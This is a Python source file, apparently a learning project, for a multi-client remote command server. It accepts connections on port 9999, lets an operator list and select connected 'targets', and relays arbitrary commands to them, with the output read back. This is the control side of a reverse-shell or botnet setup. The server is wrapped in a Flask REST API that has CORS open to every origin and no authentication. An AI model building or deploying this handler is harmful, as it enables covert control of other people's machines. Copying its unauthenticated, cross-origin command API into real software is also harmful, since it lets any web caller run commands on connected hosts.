import socket  # a way two computer connected to each other
import threading
from queue import Queue
import time
from flask import Flask
from flask_restful import Api, Resource, reqparse, marshal_with, fields
from flask_cors import CORS

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
response = []  # send the status back to who is maing the requests
current_conn = []  # hold the conn to use for start_turtle
# wrap everything with an api
app = Flask(__name__)
api = Api(app)
CORS(app)  # enable cross origin resources sharing

commands_args = reqparse.RequestParser()
commands_args.add_argument(
    "cmd", type=str, help="Command required", required=False)
commands_args.add_argument(
    "status", type=str, help="Status not available", required=False)

resource_fields = {
    "cmd": fields.String,
    "status": fields.String
}


class Commands(Resource):
    # @app.route("/", methods=["POST"]) not required as api already handle methods
    @marshal_with(resource_fields)
    def post(self):  # make commands to the clients
        data = commands_args.parse_args()
        cmd = data['cmd']
        # create a thread to receive data and start sending commands to the client
        start_turtle(cmd)
        stat = get_status()
        return {"cmd": f"{cmd}", "status": f"{stat}"}

    # @app.route("/", methods=["GET"])
    @marshal_with(resource_fields)
    def get(self):  # get current status
        stat = get_status()
        return {"cmd": "", "status": f"{stat}"}


api.add_resource(Commands, "/")


def get_status():  # getting the latest status of the connected terminal
    try:
        stat = response[-1]
    except:
        stat = "Status unavailable"
    stat = stat.replace("\n", "")
    stat = stat.replace("\r", "")
    return stat

# create a socket (allows two computer to connect)


def socket_create():
    try:
        global host  # 3 variables
        global port  # a way computer can identify what data is coming in. like 8080 or 3000
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(f'Socket creation error: {msg}')

# bind socket to port and wait for connection from client


def socket_bind():
    try:
        global host
        global port
        global s
        output = f'Binding socket to port {port}'
        print(output)
        response.append(output)
        s.bind((host, port))
        # listen allows server to accept connection, 5 the number of back connetions before refusing new connections
        s.listen(5)
    except socket.error as msg:
        print(f'Socket binding error: {msg} \n Retrying...')
        socket_bind()  # try again until success

# accept connections from multiple clients and saved to list


def socket_accept():
    for c in all_connections:
        c.close()  # close all old connections
    del all_connections[:]
    del all_addresses[:]  # clear them all
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)  # no timeout
            all_connections.append(conn)
            all_addresses.append(address)
            print(f"\n Connetion has been established: {address[0]}")
        except:
            print("Error accepting connection")


# Interactive prompt for sending commands remotely

def start_turtle(cmd):
    if cmd == "list":
        list_connections()
    elif "select" in cmd:
        conn = get_target(cmd)
        current_conn.append(conn)
    else:
        try:
            send_target_commands(current_conn[-1], cmd)
        except:
            print("Command not regconized")
# display all current connections


def list_connections():
    results = ""
    for i, conn in enumerate(all_connections):
        try:
            # only to check if we can send the message
            conn.send(str.encode(" "))
            conn.recv(4096)
        except:
            del all_connections[i]
            del all_addresses[i]
            del current_conn[:]
            continue
        # 0 is the ip address, 1 is the port number
        results += f"{i}   {all_addresses[i][0]}   {all_addresses[i][1]} \n"
    output = f"---CLients---\n {results}"
    response.append(output)
    print(output)


def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        output = f"You are now connected to {str(all_addresses[target][0])}"
        response.append(output)
        print(output)
        # end to not create a new line
        print(f"{str(all_addresses[target][0])}>", end="")

        return conn
    except:
        print("Not a valid connection")
        return None
# connect with remote target client


def send_target_commands(conn, cmd):
    # looks for whatever you want and send the command to the client
    try:
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = conn.recv(4096).decode("utf-8")
            response.append(client_response)
            print(client_response)
    except:
        print("Connetion was lost")
        del response[:]
        return
# create worker threads


def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # stop running when the program stops
        t.start()

# do the next job in the queue(one handles running the api, one handles creating and maintaining the socket)


def work():
    while True:
        x = queue.get()
        if x == 1:
            app.run(debug=False)
        if x == 2:
            time.sleep(0.01)
            socket_create()
            socket_bind()
            socket_accept()
            # sys.exit()
        # if x == 3:
        #     time.sleep(0.01)
        #     start_turtle()
        queue.task_done()


# each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


if __name__ == "__main__":
    create_worker()
    create_jobs()
